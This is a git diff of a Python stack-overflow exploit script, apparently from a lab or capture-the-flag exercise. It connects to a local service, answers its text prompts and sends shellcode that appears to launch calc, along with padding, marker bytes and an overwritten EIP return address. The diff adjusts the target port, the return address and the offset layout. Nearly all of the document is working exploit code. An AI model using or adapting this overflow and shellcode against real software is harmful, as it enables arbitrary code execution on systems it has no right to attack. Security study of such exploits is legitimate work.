@@ -3,7 +3,7 @@ import struct
 import time
 
 s = socket.socket()
-s.connect(("localhost", 379))
+s.connect(("localhost", 3724))
 
 calc =  b""
 calc += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
@@ -31,7 +31,8 @@ calc += b"\x78\x65\x00"
 
 #new_eip = struct.pack("<I", 0x0062F0DA)
 #new_eip = struct.pack("<I", 0x00D237E0)
-new_eip = struct.pack("<I", 0x00401489)
+# new_eip = struct.pack("<I", 0x00401489)
+new_eip = struct.pack("<I", 0x0804937a)
 
 nop_sled = b"\x90" * 32
 
@@ -47,7 +48,7 @@ while len(decoded) != 0:
         s.send(msg.encode())
     
     if decoded.__contains__("pick a name"):  
-        msg = "jack"      
+        msg = "jack"
         print(f">>> Sending {msg}\n")
         s.send(msg.encode())
 
@@ -58,11 +59,14 @@ while len(decoded) != 0:
 
     if decoded.__contains__("shall we drink to?"):
         payload = [
-            b"A" * 76,
-            #b"B" * 4,
+            b"A" * 60, #41
+            b"B" * 4,  #42
+            b"C" * 4,  #43
+            b"D" * 4,  #44
+            b"E" * 4,  #45
             new_eip
-            #b"C" * 25,
-            #b"D" * 25
+            # b"F" * 4,  #46
+            # b"G" * 4,  #47
         ]
         payload = b"".join(payload)        
         print(f">>> Sending stack overflow and eip redirect\n")
